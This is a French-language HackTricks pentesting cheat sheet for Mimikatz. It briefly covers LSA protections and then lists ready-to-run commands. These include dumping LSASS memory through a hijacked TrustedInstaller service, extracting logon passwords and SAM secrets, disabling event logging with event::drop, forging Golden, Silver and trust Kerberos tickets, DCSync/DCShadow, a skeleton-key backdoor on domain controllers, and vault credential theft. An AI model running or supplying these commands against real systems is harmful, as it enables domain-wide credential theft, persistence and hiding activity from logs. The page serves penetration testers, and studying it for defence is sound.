# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Vous voulez voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Cette page est basée sur une page de [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Consultez l'original pour plus d'informations !

## LM et texte en clair en mémoire

À partir de Windows 8.1 et de Windows Server 2012 R2, des mesures significatives ont été mises en place pour protéger contre le vol d'informations d'identification :

- Les **hachages LM et les mots de passe en clair** ne sont plus stockés en mémoire pour renforcer la sécurité. Un paramètre de registre spécifique, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, doit être configuré avec une valeur DWORD de `0` pour désactiver l'authentification Digest, garantissant que les mots de passe "en clair" ne sont pas mis en cache dans LSASS.

- La **Protection LSA** est introduite pour protéger le processus Autorité de sécurité locale (LSA) contre la lecture non autorisée de la mémoire et l'injection de code. Cela est réalisé en marquant le LSASS comme un processus protégé. L'activation de la Protection LSA implique :
1. La modification du registre à _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ en définissant `RunAsPPL` sur `dword:00000001`.
2. La mise en œuvre d'un objet de stratégie de groupe (GPO) qui impose ce changement de registre sur les appareils gérés.

Malgré ces protections, des outils comme Mimikatz peuvent contourner la Protection LSA en utilisant des pilotes spécifiques, bien que de telles actions soient susceptibles d'être enregistrées dans les journaux d'événements.

### Contrebalancer la suppression du privilège SeDebugPrivilege

Les administrateurs ont généralement le privilège SeDebugPrivilege, qui leur permet de déboguer des programmes. Ce privilège peut être restreint pour empêcher les vidages de mémoire non autorisés, une technique courante utilisée par les attaquants pour extraire des informations d'identification de la mémoire. Cependant, même avec ce privilège supprimé, le compte TrustedInstaller peut toujours effectuer des vidages de mémoire en utilisant une configuration de service personnalisée :
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Cela permet de copier la mémoire de `lsass.exe` dans un fichier, qui peut ensuite être analysé sur un autre système pour extraire les informations d'identification :
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Options de Mimikatz

La manipulation des journaux d'événements dans Mimikatz implique deux actions principales : effacer les journaux d'événements et patcher le service Événement pour empêcher l'enregistrement de nouveaux événements. Voici les commandes pour effectuer ces actions :

#### Effacement des journaux d'événements

- **Commande** : Cette action vise à supprimer les journaux d'événements, rendant plus difficile le suivi des activités malveillantes.
- Mimikatz ne fournit pas de commande directe dans sa documentation standard pour effacer directement les journaux d'événements via sa ligne de commande. Cependant, la manipulation des journaux d'événements implique généralement l'utilisation d'outils système ou de scripts en dehors de Mimikatz pour effacer des journaux spécifiques (par exemple, en utilisant PowerShell ou l'Observateur d'événements Windows).

#### Fonctionnalité expérimentale : Patch du service Événement

- **Commande** : `event::drop`
- Cette commande expérimentale est conçue pour modifier le comportement du service d'enregistrement des événements, empêchant efficacement l'enregistrement de nouveaux événements.
- Exemple : `mimikatz "privilege::debug" "event::drop" exit`

- La commande `privilege::debug` garantit que Mimikatz fonctionne avec les privilèges nécessaires pour modifier les services système.
- La commande `event::drop` patche ensuite le service d'enregistrement des événements.


### Attaques de Tickets Kerberos

### Création de Golden Ticket

Un Golden Ticket permet l'usurpation d'identité à l'échelle du domaine. Commande clé et paramètres :

- Commande : `kerberos::golden`
- Paramètres :
- `/domain` : Le nom de domaine.
- `/sid` : L'identifiant de sécurité (SID) du domaine.
- `/user` : Le nom d'utilisateur à usurper.
- `/krbtgt` : Le hachage NTLM du compte de service KDC du domaine.
- `/ptt` : Injecte directement le ticket en mémoire.
- `/ticket` : Enregistre le ticket pour une utilisation ultérieure.

Exemple :
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Création de Ticket Silver

Les Tickets Silver accordent l'accès à des services spécifiques. Commande clé et paramètres :

- Commande : Similaire au Golden Ticket mais cible des services spécifiques.
- Paramètres :
- `/service` : Le service à cibler (par exemple, cifs, http).
- Autres paramètres similaires au Golden Ticket.

Exemple :
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Création de Ticket de Confiance

Les Tickets de Confiance sont utilisés pour accéder à des ressources entre domaines en exploitant les relations de confiance. Commande clé et paramètres :

- Commande : Similaire au Golden Ticket mais pour les relations de confiance.
- Paramètres :
- `/target` : Le FQDN du domaine cible.
- `/rc4` : Le hachage NTLM du compte de confiance.

Exemple :
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Commandes Kerberos Supplémentaires

- **Liste des Tickets**:
- Commande: `kerberos::list`
- Liste tous les tickets Kerberos pour la session utilisateur actuelle.

- **Passer le Cache**:
- Commande: `kerberos::ptc`
- Injecte les tickets Kerberos à partir des fichiers cache.
- Exemple: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Passer le Ticket**:
- Commande: `kerberos::ptt`
- Permet d'utiliser un ticket Kerberos dans une autre session.
- Exemple: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purger les Tickets**:
- Commande: `kerberos::purge`
- Efface tous les tickets Kerberos de la session.
- Utile avant d'utiliser des commandes de manipulation de tickets pour éviter les conflits.


### Manipulation de l'Annuaire Actif

- **DCShadow**: Faire temporairement agir une machine comme un DC pour la manipulation d'objets AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imiter un DC pour demander des données de mot de passe.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Accès aux Informations d'Identification

- **LSADUMP::LSA**: Extraire les informations d'identification de LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Imiter un DC en utilisant les données de mot de passe d'un compte d'ordinateur.
- *Aucune commande spécifique fournie pour NetSync dans le contexte original.*

- **LSADUMP::SAM**: Accéder à la base de données SAM locale.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Décrypter les secrets stockés dans le registre.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Définir un nouveau hachage NTLM pour un utilisateur.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Récupérer les informations d'authentification de confiance.
- `mimikatz "lsadump::trust" exit`

### Divers

- **MISC::Skeleton**: Injecter une porte dérobée dans LSASS sur un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Élévation de Privilèges

- **PRIVILEGE::Backup**: Acquérir des droits de sauvegarde.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtenir des privilèges de débogage.
- `mimikatz "privilege::debug" exit`

### Extraction d'Informations d'Identification

- **SEKURLSA::LogonPasswords**: Afficher les informations d'identification des utilisateurs connectés.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extraire les tickets Kerberos de la mémoire.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulation de SID et de Jeton

- **SID::add/modify**: Changer le SID et SIDHistory.
- Ajouter: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modifier: *Aucune commande spécifique pour modifier dans le contexte original.*

- **TOKEN::Elevate**: Imiter des jetons.
- `mimikatz "token::elevate /domainadmin" exit`

### Services Terminal

- **TS::MultiRDP**: Autoriser plusieurs sessions RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Liste des sessions TS/RDP.
- *Aucune commande spécifique fournie pour TS::Sessions dans le contexte original.*

### Coffre-fort

- Extraire les mots de passe du coffre-fort Windows.
- `mimikatz "vault::cred /patch" exit`
